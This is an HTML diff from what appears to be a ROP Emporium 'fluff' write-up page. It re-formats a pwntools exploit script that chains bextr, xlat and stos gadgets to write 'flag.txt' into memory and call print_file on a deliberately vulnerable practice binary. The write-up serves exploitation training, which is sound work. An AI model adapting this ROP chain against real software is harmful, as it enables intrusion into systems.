@@ -55,54 +55,39 @@
 <div>
     <img src="../imgs/rop_emporium/fluff2.png" alt="">
 </div>
-<div>
-    <style 
-        type="text/css">
-            pre code {
-                      background-color: #008080;
-                      border: 1px solid #999;
-                      display: block;
-                      padding: 15px;
-                      color:  #F5F5DC;
-                    }
-    </style>
-    <pre>
-        <code>
-!/usr/bin/env python
+<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #839496; background-color: #dc322f">!</span><span style="color: #586e75">/</span><span style="color: #839496">usr</span><span style="color: #586e75">/</span><span style="color: #268bd2">bin</span><span style="color: #586e75">/</span><span style="color: #839496">env</span> <span style="color: #839496">python</span>
 
-from pwn import *
-elf = context.binary = ELF('./fluff')
-libc = elf.libc
-p = elf.process()
+<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
+<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./fluff'</span><span style="color: #839496">)</span>
+<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>
+<span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
 
-string = "flag.txt"
-tmp = 0
+<span style="color: #839496">string</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">"flag.txt"</span>
+<span style="color: #839496">tmp</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">0</span>
 
-write_loc = 0x601038
-pop_rdi = p64(0x4006a3)
-eax_0 = p64(0x400610)       #mov eax, 0 ; pop reg
-print_file = p64(0x400620)
-bextr = p64(0x40062a)       #pop rdx,rcx ; bextr rbx,rcx,rdx
-xlat = p64(0x400628)        #al = rbx+al
-stos = p64(0x400639)        #write al to rdi + increment rdi
+<span style="color: #839496">write_loc</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">0x601038</span>
+<span style="color: #839496">pop_rdi</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4006a3</span><span style="color: #839496">)</span>
+<span style="color: #839496">eax_0</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400610</span><span style="color: #839496">)</span>       <span style="color: #586e75; font-style: italic">#mov eax, 0 ; pop reg</span>
+<span style="color: #839496">print_file</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400620</span><span style="color: #839496">)</span>
+<span style="color: #839496">bextr</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x40062a</span><span style="color: #839496">)</span>       <span style="color: #586e75; font-style: italic">#pop rdx,rcx ; bextr rbx,rcx,rdx</span>
+<span style="color: #839496">xlat</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400628</span><span style="color: #839496">)</span>        <span style="color: #586e75; font-style: italic">#al = rbx+al</span>
+<span style="color: #839496">stos</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x400639</span><span style="color: #839496">)</span>        <span style="color: #586e75; font-style: italic">#write al to rdi + increment rdi</span>
 
-#padding + set al to 0 + set rdi to our write location
-payload = b"A"*40 + eax_0 + b'BBBBBBBB' + pop_rdi + p64(write_loc)
+<span style="color: #586e75; font-style: italic">#padding + set al to 0 + set rdi to our write location</span>
+<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b"A"</span><span style="color: #586e75">*</span><span style="color: #2aa198">40</span> <span style="color: #586e75">+</span> <span style="color: #839496">eax_0</span> <span style="color: #586e75">+</span> <span style="color: #2aa198">b'BBBBBBBB'</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(write_loc)</span>
 
-for c in string:
-    addr = next(elf.search(ord(c)))                         #retrieve address of each char
-    buf = bextr + p64(0x4000) + p64(addr -  0x3ef2 - tmp)   #use bxtr to set rbx to the value of address
-    buf += xlat                                             #use xlat to set al to rbx
-    buf += stos                                             #use stos to write al to memory at location rdi
-    payload += buf
-    tmp = ord(c)
+<span style="color: #859900">for</span> <span style="color: #839496">c</span> <span style="color: #859900">in</span> <span style="color: #839496">string:</span>
+    <span style="color: #839496">addr</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">next</span><span style="color: #839496">(elf</span><span style="color: #586e75">.</span><span style="color: #839496">search(</span><span style="color: #268bd2">ord</span><span style="color: #839496">(c)))</span>                         <span style="color: #586e75; font-style: italic">#retrieve address of each char</span>
+    <span style="color: #839496">buf</span> <span style="color: #586e75">=</span> <span style="color: #839496">bextr</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4000</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(addr</span> <span style="color: #586e75">-</span>  <span style="color: #2aa198">0x3ef2</span> <span style="color: #586e75">-</span> <span style="color: #839496">tmp)</span>   <span style="color: #586e75; font-style: italic">#use bxtr to set rbx to the value of address</span>
+    <span style="color: #839496">buf</span> <span style="color: #586e75">+=</span> <span style="color: #839496">xlat</span>                                             <span style="color: #586e75; font-style: italic">#use xlat to set al to rbx</span>
+    <span style="color: #839496">buf</span> <span style="color: #586e75">+=</span> <span style="color: #839496">stos</span>                                             <span style="color: #586e75; font-style: italic">#use stos to write al to memory at location rdi</span>
+    <span style="color: #839496">payload</span> <span style="color: #586e75">+=</span> <span style="color: #839496">buf</span>
+    <span style="color: #839496">tmp</span> <span style="color: #586e75">=</span> <span style="color: #268bd2">ord</span><span style="color: #839496">(c)</span>
 
-payload += pop_rdi + p64(write_loc) + print_file            #call print_file function
+<span style="color: #839496">payload</span> <span style="color: #586e75">+=</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(write_loc)</span> <span style="color: #586e75">+</span> <span style="color: #839496">print_file</span>            <span style="color: #586e75; font-style: italic">#call print_file function</span>
 
-p.sendline(payload)
-p.interactive()
-        </code>
-    </pre>
-</div>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload)</span>
+<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
+</pre></div>
 <br><br>
 <script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
